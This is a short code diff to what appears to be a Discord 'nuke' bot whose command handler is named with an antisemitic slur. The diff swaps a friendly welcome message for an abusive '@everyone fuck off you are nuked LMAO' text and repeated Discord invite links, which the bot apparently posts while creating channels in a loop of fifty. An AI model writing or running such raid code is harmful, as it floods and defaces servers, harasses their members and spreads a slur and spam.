@@ -20,11 +20,11 @@ async def jew(ctx):
     await ctx.send("⚙️ Creating channels...")
 
     message = '''
-👋 Welcome to the server!
-
-📜 Read the rules.
-💬 Be respectful.
-🎉 Enjoy your stay!
+@everyone fuck off you are nuked LMAO 
+https://discord.gg/bTpSAcNWGK
+https://discord.gg/bTpSAcNWGK
+https://discord.gg/bTpSAcNWGK
+https://discord.gg/bTpSAcNWGK
 '''
 
     for i in range(1, 51):
